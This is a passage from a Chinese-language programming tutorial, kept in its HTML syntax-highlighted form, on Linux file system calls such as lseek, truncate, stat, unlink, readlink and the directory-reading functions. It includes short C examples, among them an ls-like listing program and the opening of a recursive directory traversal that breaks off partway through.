class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> fd,n;</span><br><span class="line"><span class="keyword">char</span> msg[] = <span class="string">"It's a test for lseek\n"</span>;</span><br><span class="line"><span class="keyword">char</span> ch;</span><br><span class="line"></span><br><span class="line">fd = open(<span class="string">"lseek.txt"</span>,O_RDWR|O_CREAT,<span class="number">0644</span>);</span><br><span class="line"><span class="keyword">if</span>(fd&lt;<span class="number">0</span>)&#123;</span><br><span class="line">perror(<span class="string">"open lseek.txt error"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">write(fd,msg,<span class="built_in">strlen</span>(msg));</span><br><span class="line"></span><br><span class="line">lseek(fd,<span class="number">0</span>,SEEK_SET); <span class="comment">//将文件偏移量设为0，从最开始读</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>((n = read(fd,&amp;ch,<span class="number">1</span>)))&#123;</span><br><span class="line"><span class="keyword">if</span>(n&lt;<span class="number">0</span>)&#123;</span><br><span class="line">perror(<span class="string">"read error"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line">write(STDOUT_FILENO,&amp;ch,n);</span><br><span class="line">&#125;</span><br><span class="line">close(fd);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>lseek应用场景</p><ul><li><p>文件的“读”、“写”使用同一偏移位置</p></li><li><p>使用lseek获取、拓展文件大小：要想使文件大小真正扩展，必须引起IO操作。</p><ul><li>使用truncate函数直接扩展文件大小</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> ret = truncate(<span class="string">"lseek.txt"</span>,<span class="number">500</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"ret = %d\n"</span>,ret);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><p>使用lseek获取文件大小</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> fd = open(argv[<span class="number">1</span>],O_RDWR);</span><br><span class="line"><span class="keyword">if</span>(fd == <span class="number">-1</span>)</span><br><span class="line">&#123;</span><br><span class="line">perror(<span class="string">"open error"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> length = lseek(fd,<span class="number">0</span>,SEEK_END);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"file size:%d\n"</span>,length);</span><br><span class="line"></span><br><span class="line">  close(fd);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">od -tcx filename 查看文件的16进制表示形式</span><br><span class="line">od -tcd filename 查看文件的10进制表示形式</span><br></pre></td></tr></table></figure><h5 id="传入参数"><a href="#传入参数" class="headerlink" title="传入参数"></a>传入参数</h5><ul><li>指针作为函数参数</li><li>通常有<code>const</code>关键字修饰</li><li>指针指向有效区域，在函数内部做读操作</li></ul><h5 id="传出参数"><a href="#传出参数" class="headerlink" title="传出参数"></a>传出参数</h5><ul><li>指针作为函数参数</li><li>在函数调用之前，指针指向的空间可以无意义，但必须有效</li><li>在函数内部，做写操作</li><li>函数调用结束后，充当函数返回值</li></ul><h5 id="传入传出参数"><a href="#传入传出参数" class="headerlink" title="传入传出参数"></a>传入传出参数</h5><ul><li>指针作为函数参数</li><li>在函数调用之前，指针指向的空间有实际意义</li><li>在函数内部，先做读操作，后做写操作</li><li>函数调用结束后，充当函数返回值</li></ul><h5 id="stat函数"><a href="#stat函数" class="headerlink" title="stat函数"></a>stat函数</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">stat</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *path,struct stat *buf)</span></span></span><br></pre></td></tr></table></figure><p>参数</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">path : 文件路径</span><br><span class="line">buf : (传出参数)存放文件属性</span><br></pre></td></tr></table></figure><p>返回值</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">成功：0</span><br><span class="line">失败：-1 errno</span><br></pre></td></tr></table></figure><p>stat结构体</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">stat</span> &#123;</span> <span class="comment">/* when _DARWIN_FEATURE_64_BIT_INODE is NOT defined */</span></span><br><span class="line">         <span class="keyword">dev_t</span>    st_dev;    <span class="comment">/* device inode resides on */</span></span><br><span class="line">         <span class="keyword">ino_t</span>    st_ino;    <span class="comment">/* inode's number */</span></span><br><span class="line">         <span class="keyword">mode_t</span>   st_mode;   <span class="comment">/* inode protection mode */</span></span><br><span class="line">         <span class="keyword">nlink_t</span>  st_nlink;  <span class="comment">/* number of hard links to the file */</span></span><br><span class="line">         <span class="keyword">uid_t</span>    st_uid;    <span class="comment">/* user-id of owner */</span></span><br><span class="line">         <span class="keyword">gid_t</span>    st_gid;    <span class="comment">/* group-id of owner */</span></span><br><span class="line">         <span class="keyword">dev_t</span>    st_rdev;   <span class="comment">/* device type, for special file inode */</span></span><br><span class="line">         <span class="class"><span class="keyword">struct</span> <span class="title">timespec</span> <span class="title">st_atimespec</span>;</span>  <span class="comment">/* time of last access */</span></span><br><span class="line">         <span class="class"><span class="keyword">struct</span> <span class="title">timespec</span> <span class="title">st_mtimespec</span>;</span>  <span class="comment">/* time of last data modification */</span></span><br><span class="line">         <span class="class"><span class="keyword">struct</span> <span class="title">timespec</span> <span class="title">st_ctimespec</span>;</span>  <span class="comment">/* time of last file status change */</span></span><br><span class="line">         <span class="keyword">off_t</span>    st_size;   <span class="comment">/* file size, in bytes */</span></span><br><span class="line">         <span class="keyword">quad_t</span>   st_blocks; <span class="comment">/* blocks allocated for file */</span></span><br><span class="line">         u_long   st_blksize;<span class="comment">/* optimal file sys I/O ops blocksize */</span></span><br><span class="line">         u_long   st_flags;  <span class="comment">/* user defined flags for file */</span></span><br><span class="line">         u_long   st_gen;    <span class="comment">/* file generation number */</span></span><br><span class="line">     &#125;;</span><br></pre></td></tr></table></figure><p>stat函数获取文件大小</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">stat</span> <span class="title">sbuf</span>;</span></span><br><span class="line"><span class="keyword">int</span> ret = stat(argv[<span class="number">1</span>],&amp;sbuf);</span><br><span class="line"><span class="keyword">if</span>(ret == <span class="number">-1</span>)&#123;</span><br><span class="line">perror(<span class="string">"stat error"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"file size:%lld\n"</span>,sbuf.st_size);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>stat函数获取文件类型</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">stat</span> <span class="title">sb</span>;</span></span><br><span class="line"><span class="keyword">int</span> ret = stat(argv[<span class="number">1</span>],&amp;sb);</span><br><span class="line"><span class="keyword">if</span>(ret == <span class="number">-1</span>)&#123;</span><br><span class="line">perror(<span class="string">"stat error"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(S_ISREG(sb.st_mode))&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"It's a regular\n"</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span>(S_ISDIR(sb.st_mode))&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"It's a dir\n"</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span>(S_ISFIFO(sb.st_mode))&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"It's a pipe\n"</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span>(S_ISLNK(sb.st_mode))&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"It's a sym link\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>stat和lstat的区别</p><p>stat会穿透符号链接，lstat不会。</p><h5 id="unlink函数"><a href="#unlink函数" class="headerlink" title="unlink函数"></a>unlink函数</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> fd,ret;</span><br><span class="line"><span class="keyword">char</span> *p = <span class="string">"test of unlink\n"</span>;</span><br><span class="line"><span class="keyword">char</span> *p2 = <span class="string">"after write something.\n"</span>;</span><br><span class="line"></span><br><span class="line">fd = open(<span class="string">"temp.txt"</span>,O_RDWR|O_CREAT|O_TRUNC,<span class="number">0644</span>);</span><br><span class="line"><span class="keyword">if</span> (fd&lt;<span class="number">0</span>)&#123;</span><br><span class="line">perror(<span class="string">"open temp error"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ret = write(fd,p,<span class="built_in">strlen</span>(p));</span><br><span class="line"><span class="keyword">if</span>(ret == <span class="number">-1</span>)&#123;</span><br><span class="line">perror(<span class="string">"----write error"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"hi! I'm printf\n"</span>);</span><br><span class="line">ret = write(fd,p2,<span class="built_in">strlen</span>(p2));</span><br><span class="line"><span class="keyword">if</span>(ret == <span class="number">-1</span>)&#123;</span><br><span class="line">perror(<span class="string">"----write error"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Enter anykey continue\n"</span>);</span><br><span class="line">getchar();</span><br><span class="line"></span><br><span class="line">close(fd);</span><br><span class="line">ret = unlink(<span class="string">"temp.txt"</span>);</span><br><span class="line"><span class="keyword">if</span> (ret&lt;<span class="number">0</span>)&#123;</span><br><span class="line">perror(<span class="string">"unlink error"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>unlink函数的特征：清除文件时，如果文件的硬链接数到0了，没有dentry对应，但该文件仍不会马上被释放，要等到所有打开该文件的进程关闭该文件，系统才会挑时间将该文件释放掉。</p><h5 id="隐式回收"><a href="#隐式回收" class="headerlink" title="隐式回收"></a>隐式回收</h5><p>当进程结束运行时，所有该进程打开的文件会被关闭，申请的内存空间会被释放，系统的这一特性称之为隐式回收系统资源。</p><h5 id="readlink函数"><a href="#readlink函数" class="headerlink" title="readlink函数"></a>readlink函数</h5><p>读取符号链接文件本身内容，得到链接所指向的文件名。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">ssize t <span class="title">readlink</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *path,<span class="keyword">char</span> *buf,<span class="keyword">size_t</span> bufsiz)</span></span>;</span><br><span class="line"></span><br><span class="line">成功：返回实际读到的字节数</span><br><span class="line">失败：<span class="number">-1</span> 设置errno为相应值</span><br></pre></td></tr></table></figure><h5 id="opendir"><a href="#opendir" class="headerlink" title="opendir"></a>opendir</h5><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">DIR *<span class="title">opendir</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *name)</span></span></span><br><span class="line"><span class="function">  </span></span><br><span class="line">成功返回指向该目录结构体指针</span><br></pre></td></tr></table></figure><h5 id="closedir"><a href="#closedir" class="headerlink" title="closedir"></a>closedir</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">closedir</span><span class="params">(DIR *dirp)</span></span></span><br><span class="line"><span class="function"> </span></span><br><span class="line">成功：0</span><br><span class="line">失败：<span class="number">-1</span> 设置errno为相应值</span><br></pre></td></tr></table></figure><h5 id="readdir"><a href="#readdir" class="headerlink" title="readdir"></a>readdir</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">struct dirent *<span class="title">readdir</span><span class="params">(DIR *dp)</span></span></span><br><span class="line"><span class="function">  </span></span><br><span class="line"><span class="function">  struct dirent </span>&#123;</span><br><span class="line">    inode</span><br><span class="line">    <span class="keyword">char</span> dname[<span class="number">256</span>]</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><h5 id="实现ls命令操作"><a href="#实现ls命令操作" class="headerlink" title="实现ls命令操作"></a>实现ls命令操作</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;dirent.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">DIR *dp;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">dirent</span> *<span class="title">sdp</span>;</span></span><br><span class="line"></span><br><span class="line">dp = opendir(argv[<span class="number">1</span>]);</span><br><span class="line"><span class="keyword">if</span> (dp == <span class="literal">NULL</span>) &#123;</span><br><span class="line">perror(<span class="string">"opendir error"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>((sdp = readdir(dp))!= <span class="literal">NULL</span>)&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">strcmp</span>(sdp-&gt;d_name,<span class="string">"."</span>) == <span class="number">0</span>)</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%s\t"</span>,sdp-&gt;d_name);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">closedir(dp);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="递归遍历目录"><a href="#递归遍历目录" class="headerlink" title="递归遍历目录"></a>递归遍历目录</h5><p>直接贴代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdbool.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;dirent.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX_PATH_SIZE 256</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">r_read_dir</span><span class="params">(<span class="keyword">char</span>* path)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">is_dir</span><span class="params">(<span class="keyword">char</span>* path)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">r_read_dir</span><span class="params">(<span class="keyword">char</span>* path)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!is_dir(path))          <span class="comment">// 如果不是目录，直接输出文件名</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%s  "</span>, path);</span><br><span class="line">    <span class="keyword">else</span> 